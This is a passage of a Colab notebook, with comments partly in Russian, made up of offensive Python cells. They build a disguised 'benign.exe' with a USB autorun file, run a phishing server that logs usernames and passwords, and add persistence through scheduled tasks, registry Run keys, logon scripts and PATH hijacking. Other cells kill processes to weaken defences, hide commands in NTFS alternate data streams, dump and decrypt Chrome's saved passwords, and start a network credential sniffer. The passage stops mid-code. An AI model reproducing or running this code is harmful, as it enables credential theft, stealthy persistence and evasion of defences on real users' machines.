        "outputId": "6ffa89b2-45a7-495b-c785-1ada06a97427"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Found existing installation: pathlib 1.0.1\n",
            "Uninstalling pathlib-1.0.1:\n",
            "  Would remove:\n",
            "    /usr/local/lib/python3.9/dist-packages/pathlib-1.0.1.dist-info/*\n",
            "    /usr/local/lib/python3.9/dist-packages/pathlib.py\n",
            "Proceed (Y/n)? \u001b[31m  ERROR: Operation cancelled by user\u001b[0m\u001b[31m\n",
            "\u001b[0m"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 149
        },
        "id": "HU4zCvTnr8fU",
        "outputId": "a9de4744-178c-4e60-dcfe-41c4c4177f99"
      },
      "outputs": [
        {
          "ename": "SystemExit",
          "evalue": "ignored",
          "output_type": "error",
          "traceback": [
            "An exception has occurred, use %tb to see the full traceback.\n",
            "\u001b[0;31mSystemExit\u001b[0m\u001b[0;31m:\u001b[0m The 'pathlib' package is an obsolete backport of a standard library package and is incompatible with PyInstaller. Please remove this package (located in /usr/local/lib/python3.8/dist-packages) using\n    \"/usr/bin/python3\" -m pip uninstall pathlib\nthen try again.\n"
          ]
        }
      ],
      "source": [
        "#Autorun Scripts\n",
        "#Сценарии автозапуска, в который перемещает файлы на USB и установливает значение скрыто\n",
        "\n",
        "import PyInstaller.__main__\n",
        "import shutil\n",
        "import os\n",
        "\n",
        "filename = \"malicious.py\"\n",
        "exename = \"benign.exe\"\n",
        "icon = \"Firefox.ico\"\n",
        "pwd = os.getcwd()\n",
        "usbdir = os.path.join(pwd,\"USB\")\n",
        "\n",
        "if os.path.isfile(exename):\n",
        "    os.remove(exename)\n",
        "\n",
        "# Create executable from Python script\n",
        "PyInstaller.__main__.run([\n",
        "    \"malicious.py\",\n",
        "    \"--onefile\",\n",
        "    \"--clean\",\n",
        "    \"--log-level=ERROR\",\n",
        "    \"--name=\"+exename,\n",
        "    \"--icon=\"+icon\n",
        "])\n",
        "\n",
        "# Clean up after Pyinstaller\n",
        "shutil.move(os.path.join(pwd,\"dist\",exename),pwd)\n",
        "shutil.rmtree(\"dist\")\n",
        "shutil.rmtree(\"build\")\n",
        "shutil.rmtree(\"__pycache__\")\n",
        "os.remove(exename+\".spec\")\n",
        "\n",
        "# Create Autorun File\n",
        "with open(\"Autorun.inf\",\"w\") as o:\n",
        "    o.write(\"(Autorun)\\n\")\n",
        "    o.write(\"Open=\"+exename+\"\\n\")\n",
        "    o.write(\"Action=Start Firefox Portable\\n\")\n",
        "    o.write(\"Label=My USB\\n\")\n",
        "    o.write(\"Icon=\"+exename+\"\\n\")\n",
        "\n",
        "# Move files to USB and set to hidden\n",
        "shutil.move(exename,usbdir)\n",
        "shutil.move(\"Autorun.inf\",usbdir)\n",
        "os.system(\"attrib +h \"+os.path.join(usbdir,\"Autorun.inf\"))"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "rfQZmgnRpKQf"
      },
      "source": [
        "# Part_4"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "qAQ88YnEpg88",
        "outputId": "832b5602-4158-4e7e-8396-fc5f72cf8297"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Server started http://localhost:8443\n",
            "Server stopped.\n"
          ]
        }
      ],
      "source": [
        "#Spearphishing_Links\n",
        "# создание фишинговой ссылки, которая крадет логин и пароль\n",
        "\n",
        "from http.server import BaseHTTPRequestHandler, HTTPServer\n",
        "from urllib.parse import urlparse,parse_qs\n",
        "\n",
        "hostName = \"localhost\"\n",
        "serverPort = 8443\n",
        "\n",
        "class MyServer(BaseHTTPRequestHandler):\n",
        "    def do_GET(self):\n",
        "        queries = parse_qs(urlparse(self.path).query)\n",
        "        print(\"Username: %s, Password: %s\"%(queries[\"user\"][0],queries[\"password\"][0]))\n",
        "        self.send_response(300)\n",
        "        self.send_header(\"Location\", \"http://www.google.com\")\n",
        "        self.end_headers()\n",
        "\n",
        "if __name__ == \"__main__\":        \n",
        "    webServer = HTTPServer((hostName, serverPort), MyServer)\n",
        "    print(\"Server started http://%s:%s\" % (hostName, serverPort))\n",
        "\n",
        "    try:\n",
        "        webServer.serve_forever()\n",
        "    except KeyboardInterrupt:\n",
        "        pass\n",
        "\n",
        "    webServer.server_close()\n",
        "    print(\"Server stopped.\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 70
        },
        "id": "uQlplYz7vXuw",
        "outputId": "d714ad28-94e3-453d-c09d-47a8129019ea"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "I am doing malicious things\n",
            "1\n"
          ]
        },
        {
          "data": {
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            },
            "text/plain": [
              "'1'"
            ]
          },
          "execution_count": 31,
          "metadata": {},
          "output_type": "execute_result"
        }
      ],
      "source": [
        "#Scheduled_Execution\n",
        "#поместить файл sched.py в родительский каталог в отложенное время, которое мы введем\n",
        "import os, random\n",
        "from datetime import datetime,timedelta\n",
        "\n",
        "if os.system(\"schtasks /query /tn SecurityScan\") == 0:\n",
        "    os.system(\"schtasks /delete /f /tn SecurityScan\")\n",
        "\n",
        "print(\"I am doing malicious things\")\n",
        "\n",
        "filedir = os.path.join(os.getcwd(),\"sched.py\")\n",
        "\n",
        "maxInterval = 1\n",
        "interval = 1+(random.random()*(maxInterval-1))\n",
        "dt = datetime.now() + timedelta(minutes=interval)\n",
        "t = \"%s:%s\" % (str(dt.hour).zfill(2),str(dt.minute).zfill(2))\n",
        "d = \"%s/%s/%s\" % (dt.month,str(dt.day).zfill(2),dt.year)\n",
        "os.system('schtasks /create /tn SecurityScan /tr \"'+filedir+'\" /sc once /st '+t+' /sd '+d)\n",
        "input()"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ahBfeg6ypLtE"
      },
      "source": [
        "# Part_5"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 149
        },
        "id": "6bZJR556pham",
        "outputId": "691241ff-2b8c-47d6-954e-bf3b03145e34"
      },
      "outputs": [
        {
          "ename": "SystemExit",
          "evalue": "ignored",
          "output_type": "error",
          "traceback": [
            "An exception has occurred, use %tb to see the full traceback.\n",
            "\u001b[0;31mSystemExit\u001b[0m\u001b[0;31m:\u001b[0m The 'pathlib' package is an obsolete backport of a standard library package and is incompatible with PyInstaller. Please remove this package (located in /usr/local/lib/python3.8/dist-packages) using\n    \"/usr/bin/python3\" -m pip uninstall pathlib\nthen try again.\n"
          ]
        }
      ],
      "source": [
        "#Registry_Autorun\n",
        "#Регистрация. Автоматический запуск. перемещаяет и переименовывает файл\n",
        "import PyInstaller.__main__\n",
        "import shutil\n",
        "import os\n",
        "\n",
        "filename = \"malicious.py\"\n",
        "exename = \"benign.exe\"\n",
        "icon = \"Firefox.ico\"\n",
        "pwd = os.getcwd()\n",
        "usbdir = os.path.join(pwd,\"USB\")\n",
        "\n",
        "if os.path.isfile(exename):\n",
        "    os.remove(exename)\n",
        "\n",
        "# Create executable from Python script\n",
        "PyInstaller.__main__.run([\n",
        "    \"malicious.py\",\n",
        "    \"--onefile\",\n",
        "    \"--clean\",\n",
        "    \"--log-level=ERROR\",\n",
        "    \"--name=\"+exename,\n",
        "    \"--icon=\"+icon\n",
        "])\n",
        "\n",
        "# Clean up after Pyinstaller\n",
        "shutil.move(os.path.join(pwd,\"dist\",exename),pwd)\n",
        "shutil.rmtree(\"dist\")\n",
        "shutil.rmtree(\"build\")\n",
        "shutil.rmtree(\"__pycache__\")\n",
        "os.remove(exename+\".spec\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "2M6PV-u4GxK3",
        "outputId": "47c6fa44-13c1-48bb-b419-6f738420c520"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "\u001b[?25l[\u001b[90m..................\u001b[0m] / rollbackFailedOptional: \u001b[34;40mverb\u001b[0m \u001b[35mnpm-session\u001b[0m c6b352796e5d116\u001b[0m\u001b[K\r[\u001b[90m..................\u001b[0m] / rollbackFailedOptional: \u001b[34;40mverb\u001b[0m \u001b[35mnpm-session\u001b[0m c6b352796e5d116\u001b[0m\u001b[K\r[\u001b[7m       \u001b[27m\u001b[90m...........\u001b[0m] \\ postinstall: \u001b[7msill\u001b[0m \u001b[35minstall\u001b[0m executeActions\u001b[0m\u001b[K\r[\u001b[7m            \u001b[27m\u001b[90m......\u001b[0m] / refresh-package-json:winreg: \u001b[32;40mtiming\u001b[0m \u001b[35maction:finalize\u001b[0m Comp\u001b[0m\u001b[K\r\r\u001b[K\u001b[?25h\u001b[37;40mnpm\u001b[0m \u001b[0m\u001b[30;43mWARN\u001b[0m \u001b[0m\u001b[35msaveError\u001b[0m ENOENT: no such file or directory, open '/content/package.json'\n",
            "\u001b[0m\u001b[37;40mnpm\u001b[0m \u001b[0m\u001b[30;43mWARN\u001b[0m \u001b[0m\u001b[35menoent\u001b[0m ENOENT: no such file or directory, open '/content/package.json'\n",
            "\u001b[0m\u001b[37;40mnpm\u001b[0m \u001b[0m\u001b[30;43mWARN\u001b[0m\u001b[35m\u001b[0m content No description\n",
            "\u001b[0m\u001b[37;40mnpm\u001b[0m \u001b[0m\u001b[30;43mWARN\u001b[0m\u001b[35m\u001b[0m content No repository field.\n",
            "\u001b[0m\u001b[37;40mnpm\u001b[0m \u001b[0m\u001b[30;43mWARN\u001b[0m\u001b[35m\u001b[0m content No README data\n",
            "\u001b[0m\u001b[37;40mnpm\u001b[0m \u001b[0m\u001b[30;43mWARN\u001b[0m\u001b[35m\u001b[0m content No license field.\n",
            "\u001b[0m\n",
            "\u001b[K\u001b[?25h+ winreg@1.2.4\n",
            "updated 1 package and audited 1 package in 0.345s\n",
            "found \u001b[92m0\u001b[0m vulnerabilities\n",
            "\n",
            "\u001b[K\u001b[?25h\n",
            "\u001b[33m\u001b[39m\n",
            "\u001b[33m   ╭───────────────────────────────────────────────────────────────╮\u001b[39m\n",
            "   \u001b[33m│\u001b[39m                                                               \u001b[33m│\u001b[39m\n",
            "   \u001b[33m│\u001b[39m      New \u001b[31mmajor\u001b[39m version of npm available! \u001b[31m6.14.8\u001b[39m → \u001b[32m9.6.0\u001b[39m       \u001b[33m│\u001b[39m\n",
            "   \u001b[33m│\u001b[39m   \u001b[33mChangelog:\u001b[39m \u001b[36mhttps://github.com/npm/cli/releases/tag/v9.6.0\u001b[39m   \u001b[33m│\u001b[39m\n",
            "   \u001b[33m│\u001b[39m               Run \u001b[32mnpm install -g npm\u001b[39m to update!               \u001b[33m│\u001b[39m\n",
            "   \u001b[33m│\u001b[39m                                                               \u001b[33m│\u001b[39m\n",
            "\u001b[33m   ╰───────────────────────────────────────────────────────────────╯\u001b[39m\n",
            "\u001b[33m\u001b[39m\n"
          ]
        }
      ],
      "source": [
        "!npm install winreg --production"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 87
        },
        "id": "KqNq47uBvySk",
        "outputId": "618f651d-568d-4d55-8762-2617b77d09d0"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'import os \\nimport shutil\\nimport winreg\\n\\nfiledir = os.path.join(os.getcwd(),\"Temp\")\\nfilename = \"benign.exe\"\\nfilepath = os.path.join(filedir,filename)\\n\\nif os.path.isfile(filepath):\\n    os.remove(filepath)\\n\\n# Use BuildExe to create malicious executable\\nos.system(\"python BuildExe.py\")\\n\\n# Move malicious executable to desired directory\\nshutil.move(filename,filedir)\\n\\n\\n# Windows default autorun keys:\\n# HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\n# HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\n# HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\n# HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\n\\nregkey = 1\\n\\nif regkey < 2:\\n    reghive = winreg.HKEY_CURRENT_USER\\nelse:\\n    reghive = winreg.HKEY_LOCAL_MACHINE\\nif (regkey % 2) == 0:\\n    regpath = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\\nelse:\\n    regpath = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\"\\n\\n\\n# Add registry autorun key\\nreg = winreg.ConnectRegistry(None,reghive)\\nkey = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)\\nwinreg.SetValueEx(key,\"SecurityScan\",0,winreg.REG_SZ,filepath)'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 2
        }
      ],
      "source": [
        "\"\"\"import os \n",
        "import shutil\n",
        "import winreg\n",
        "\n",
        "filedir = os.path.join(os.getcwd(),\"Temp\")\n",
        "filename = \"benign.exe\"\n",
        "filepath = os.path.join(filedir,filename)\n",
        "\n",
        "if os.path.isfile(filepath):\n",
        "    os.remove(filepath)\n",
        "\n",
        "# Use BuildExe to create malicious executable\n",
        "os.system(\"python BuildExe.py\")\n",
        "\n",
        "# Move malicious executable to desired directory\n",
        "shutil.move(filename,filedir)\n",
        "\n",
        "\n",
        "# Windows default autorun keys:\n",
        "# HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n",
        "# HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n",
        "# HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n",
        "# HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n",
        "\n",
        "regkey = 1\n",
        "\n",
        "if regkey < 2:\n",
        "    reghive = winreg.HKEY_CURRENT_USER\n",
        "else:\n",
        "    reghive = winreg.HKEY_LOCAL_MACHINE\n",
        "if (regkey % 2) == 0:\n",
        "    regpath = \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\n",
        "else:\n",
        "    regpath = \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\n",
        "\n",
        "\n",
        "# Add registry autorun key\n",
        "reg = winreg.ConnectRegistry(None,reghive)\n",
        "key = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)\n",
        "winreg.SetValueEx(key,\"SecurityScan\",0,winreg.REG_SZ,filepath)\"\"\""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 87
        },
        "id": "aFQ8XkBNwDhx",
        "outputId": "1bed0363-e5c9-4b5c-b1f2-3e005a11e272"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'#Hijack_Execution_Flow\\nimport os, winreg\\n\\ndef readPathValue(reghive,regpath):\\n    reg = winreg.ConnectRegistry(None,reghive)\\n    key = winreg.OpenKey(reg,regpath,access=winreg.KEY_READ)\\n    index = 0\\n    while True:\\n        val = winreg.EnumValue(key,index)\\n        if val[0] == \"Path\":\\n            return val[1]\\n        index += 1\\n\\ndef editPathValue(reghive,regpath,targetdir):\\n    path = readPathValue(reghive,regpath)\\n    newpath = targetdir + \";\" + path\\n    reg = winreg.ConnectRegistry(None,reghive)\\n    key = winreg.OpenKey(reg,regpath,access=winreg.KEY_SET_VALUE)\\n    winreg.SetValueEx(key,\"Path\",0,winreg.REG_EXPAND_SZ,newpath)\\n    \\n# Modify user path\\n#reghive = winreg.HKEY_CURRENT_USER\\n#regpath = \"Environment\"\\ntargetdir = os.getcwd()\\n\\n#editPathValue(reghive,regpath,targetdir)\\n\\n# Modify SYSTEM path\\nreghive = winreg.HKEY_LOCAL_MACHINE\\nregpath = \"SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment\"\\neditPathValue(reghive,regpath,targetdir)'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 3
        }
      ],
      "source": [
        "\"\"\"#Hijack_Execution_Flow\n",
        "import os, winreg\n",
        "\n",
        "def readPathValue(reghive,regpath):\n",
        "    reg = winreg.ConnectRegistry(None,reghive)\n",
        "    key = winreg.OpenKey(reg,regpath,access=winreg.KEY_READ)\n",
        "    index = 0\n",
        "    while True:\n",
        "        val = winreg.EnumValue(key,index)\n",
        "        if val[0] == \"Path\":\n",
        "            return val[1]\n",
        "        index += 1\n",
        "\n",
        "def editPathValue(reghive,regpath,targetdir):\n",
        "    path = readPathValue(reghive,regpath)\n",
        "    newpath = targetdir + \";\" + path\n",
        "    reg = winreg.ConnectRegistry(None,reghive)\n",
        "    key = winreg.OpenKey(reg,regpath,access=winreg.KEY_SET_VALUE)\n",
        "    winreg.SetValueEx(key,\"Path\",0,winreg.REG_EXPAND_SZ,newpath)\n",
        "    \n",
        "# Modify user path\n",
        "#reghive = winreg.HKEY_CURRENT_USER\n",
        "#regpath = \"Environment\"\n",
        "targetdir = os.getcwd()\n",
        "\n",
        "#editPathValue(reghive,regpath,targetdir)\n",
        "\n",
        "# Modify SYSTEM path\n",
        "reghive = winreg.HKEY_LOCAL_MACHINE\n",
        "regpath = \"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\"\n",
        "editPathValue(reghive,regpath,targetdir)\"\"\""
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "yrogATMppNpq"
      },
      "source": [
        "# Part_6"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 6,
      "metadata": {
        "id": "NLY9s4KipiY-"
      },
      "outputs": [],
      "source": [
        "#Logon_Scripts\n",
        "#Логин_Скрипты\n",
        "\n",
        "import PyInstaller.__main__\n",
        "import shutil\n",
        "import os\n",
        "\n",
        "filename = \"malicious.py\"\n",
        "exename = \"benign.exe\"\n",
        "icon = \"Firefox.ico\"\n",
        "pwd = os.getcwd()\n",
        "usbdir = os.path.join(pwd,\"USB\")\n",
        "\n",
        "if os.path.isfile(exename):\n",
        "    os.remove(exename)\n",
        "\n",
        "# Create executable from Python script\n",
        "PyInstaller.__main__.run([\n",
        "    \"malicious.py\",\n",
        "    \"--onefile\",\n",
        "    \"--clean\",\n",
        "    \"--log-level=ERROR\",\n",
        "    \"--name=\"+exename,\n",
        "    \"--icon=\"+icon\n",
        "])\n",
        "\n",
        "# Clean up after Pyinstaller\n",
        "shutil.move(os.path.join(pwd,\"dist\",exename),pwd)\n",
        "shutil.rmtree(\"dist\")\n",
        "shutil.rmtree(\"build\")\n",
        "shutil.rmtree(\"__pycache__\")\n",
        "os.remove(exename+\".spec\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 6,
      "metadata": {
        "id": "FINki0lAwrNG"
      },
      "outputs": [],
      "source": [
        "\n",
        "# Cоздаётся вредоносный исполняемый файл, который переностится в нужный каталог.\n",
        "\n",
        "import os, shutil, winreg\n",
        "\n",
        "filedir = os.path.join(os.getcwd(),\"Temp\")\n",
        "filename = \"benign.exe\"\n",
        "filepath = os.path.join(filedir,filename)\n",
        "\n",
        "if os.path.isfile(filepath):\n",
        "    os.remove(filepath)\n",
        "\n",
        "# Use BuildExe to create malicious executable\n",
        "os.system(\"python BuildExe.py\")\n",
        "\n",
        "# Move malicious executable to desired directory\n",
        "shutil.move(filename,filedir)\n",
        "\n",
        "\n",
        "# Windows logon script keys\n",
        "#reghive = winreg.HKEY_CURRENT_USER\n",
        "#regpath = \"Environment\"\n",
        "\n",
        "reghive = winreg.HKEY_USERS\n",
        "regpath = \"S-1-5-21-524849353-310586374-791561826-1002\\Environment\"\n",
        "\n",
        "# Add registry logon script\n",
        "reg = winreg.ConnectRegistry(None,reghive)\n",
        "key = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)\n",
        "winreg.SetValueEx(key,\"UserInitMprLogonScript\",0,winreg.REG_SZ,filepath)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "cHcZb10ApOwv"
      },
      "source": [
        "# Part_7"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 6,
      "metadata": {
        "id": "2ZnqdHKSx5sL"
      },
      "outputs": [],
      "source": [
        "#Impair_Defenses\n",
        "# Удалить ключи реестра\n",
        "import winreg,wmi,os,signal\n",
        "\n",
        "av_list = [\"notepad++\"]\n",
        "\n",
        "# Remove Registry Keys\n",
        "reghives = [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]\n",
        "regpaths = [\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\",\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"]\n",
        "for reghive in reghives:\n",
        "    for regpath in regpaths: \n",
        "        reg = winreg.ConnectRegistry(None,reghive)\n",
        "        key = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_READ)\n",
        "        try:\n",
        "            index = 0\n",
        "            while True:\n",
        "                val = winreg.EnumValue(key,index)\n",
        "                for name in av_list:\n",
        "                    if name in val[1]:\n",
        "                        print(\"Deleting %s Autorun Key\" % val[0])\n",
        "                        key2 = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_SET_VALUE)\n",
        "                        winreg.DeleteValue(key2,val[0])\n",
        "                index += 1\n",
        "        except OSError:\n",
        "            {}\n",
        "\n",
        "# Find and Kill Processes\n",
        "f = wmi.WMI()\n",
        "for process in f.Win32_Process():\n",
        "    for name in av_list:\n",
        "        if name in process.Name:\n",
        "            os.kill(int(process.processId),signal.SIGTERM)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "ZrqNqmwSySy0",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 236
        },
        "outputId": "598c5f1b-6946-4d0e-d733-8fb7488cfbac"
      },
      "outputs": [
        {
          "output_type": "error",
          "ename": "FileNotFoundError",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mFileNotFoundError\u001b[0m                         Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-4-77456f240124>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     10\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     11\u001b[0m \u001b[0;31m# Run commands from file\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 12\u001b[0;31m \u001b[0;32mwith\u001b[0m \u001b[0mopen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mcommandfile\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\"r\"\u001b[0m\u001b[0;34m)\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0mc\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     13\u001b[0m     \u001b[0;32mfor\u001b[0m \u001b[0mline\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mc\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     14\u001b[0m         \u001b[0mstr\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mos\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msystem\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0;34m\" >> \"\u001b[0m \u001b[0;34m+\u001b[0m \u001b[0mresultfile\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mFileNotFoundError\u001b[0m: [Errno 2] No such file or directory: 'benign.txt:commands.txt'"
          ]
        }
      ],
      "source": [
        "#Hide_Artifacts\n",
        "import os\n",
        "\n",
        "def buildADSFilename(filename,streamname):\n",
        "\treturn filename+\":\"+streamname\n",
        "\n",
        "decoy = \"benign.txt\"\n",
        "resultfile = buildADSFilename(decoy,\"results.txt\")\n",
        "commandfile = buildADSFilename(decoy,\"commands.txt\")\n",
        "\n",
        "# Run commands from file\n",
        "with open(commandfile,\"r\") as c:\n",
        "    for line in c:\n",
        "        str(os.system(line + \" >> \" + resultfile))\n",
        "\n",
        "# Run executable\n",
        "exefile = \"malicious.exe\"\n",
        "exepath = os.path.join(os.getcwd(),buildADSFilename(decoy,exefile))\n",
        "os.system(\"wmic process call create \"+exepath)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "BziyyAxSpQJ6"
      },
      "source": [
        "# Part_8"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "zP_pRxBupkIv"
      },
      "outputs": [],
      "source": [
        "#Credential_Dumping\n",
        "# сброс учетных данных\n",
        "import sqlite3,win32crypt,os\n",
        "\n",
        "userdir = os.path.expanduser(\"~\")\n",
        "chromepath = os.path.join(userdir,\"AppData\",\"Local\",\"Google\",\"Chrome\",\"User Data\",\"Default\",\"Login Data\")\n",
        "\n",
        "conn = sqlite3.connect(chromepath)\n",
        "c = conn.cursor()\n",
        "c.execute(\"SELECT origin_url, username_value, password_value FROM logins;\")\n",
        "\n",
        "login_data = c.fetchall()\n",
        "for URL,username,password in login_data:\n",
        "    print(password)\n",
        "    pwd = win32crypt.CryptUnprotectData(password)\n",
        "    print(\"%s, %s, %s\" % (URL,username,pwd))"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "RX0hX3MD118k"
      },
      "outputs": [],
      "source": [
        "import os\n",
        "import json\n",
        "import base64\n",
        "import sqlite3\n",
        "import win32crypt\n",
        "from Cryptodome.Cipher import AES\n",
        "import shutil\n",
        "\n",
        "def get_master_key():\n",
        " with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\Local State', \"r\") as f:\n",
        "     local_state = f.read()\n",
        "     local_state = json.loads(local_state)\n",
        " master_key = base64.b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n",
        " master_key = master_key[5:]  # removing DPAPI\n",
        " master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]\n",
        " return master_key\n",
        "\n",
        "def decrypt_payload(cipher, payload):\n",
        " return cipher.decrypt(payload)\n",
        "\n",
        "def generate_cipher(aes_key, iv):\n",
        " return AES.new(aes_key, AES.MODE_GCM, iv)\n",
        "\n",
        "def decrypt_password(buff, master_key):\n",
        " try:\n",
        "     iv = buff[3:15]\n",
        "     payload = buff[15:]\n",
        "     cipher = generate_cipher(master_key, iv)\n",
        "     decrypted_pass = decrypt_payload(cipher, payload)\n",
        "     decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes\n",
        "     return decrypted_pass\n",
        " except Exception as e:\n",
        "     # print(\"Probably saved password from Chrome version older than v80\\n\")\n",
        "     # print(str(e))\n",
        "     return \"Chrome < 80\"\n",
        "\n",
        " \n",
        "master_key = get_master_key()\n",
        "login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data'\n",
        "shutil.copy2(login_db, \"Loginvault.db\") #making a temp copy since Login Data DB is locked while Chrome is running\n",
        "conn = sqlite3.connect(\"Loginvault.db\")\n",
        "cursor = conn.cursor()\n",
        "try:\n",
        "    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins\")\n",
        "    for r in cursor.fetchall():\n",
        "        url = r[0]\n",
        "        username = r[1]\n",
        "        encrypted_password = r[2]\n",
        "        decrypted_password = decrypt_password(encrypted_password, master_key)\n",
        "        if len(username) > 0:\n",
        "            print(\"URL: \" + url + \"\\nUser Name: \" + username + \"\\nPassword: \" + decrypted_password + \"\\n\" + \"*\" * 50 + \"\\n\")\n",
        "except Exception as e:\n",
        "    pass\n",
        "cursor.close()\n",
        "conn.close()\n",
        "try:\n",
        "    os.remove(\"Loginvault.db\")\n",
        "except Exception as e:\n",
        "    pass"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "6OYXQXZ12WMv"
      },
      "outputs": [],
      "source": [
        "#Network_Sniffing\n",
        "from scapy.all import *\n",
        "from base64 import b64decode\n",
        "import re\n",
        "\n",
        "def ExtractFTP(packet):\n",
        "    payload = packet[Raw].load.decode(\"utf-8\").rstrip()\n",
        "    if payload[:4] == 'USER':\n",
        "        print(\"%s FTP Username: %s\" % (packet[IP].dst,payload[5:]))\n",
        "    elif payload[:4] == 'PASS':\n",
        "        print(\"%s FTP Password: %s\" % (packet[IP].dst,payload[5:]))\n",
        "\n",
        "emailregex = '^[a-z0-9]+[\\._]?[a-z0-9]+[@]\\w+[.]\\w{2,3}$'\n",
        "unmatched = []\n",
        "def ExtractSMTP(packet):\n",
        "    payload = packet[Raw].load\n",
        "    try:\n",
        "        decoded = b64decode(payload)\n",
        "        decoded = decoded.decode(\"utf-8\")\n",
        "        connData = [packet[IP].src,packet[TCP].sport]\n",
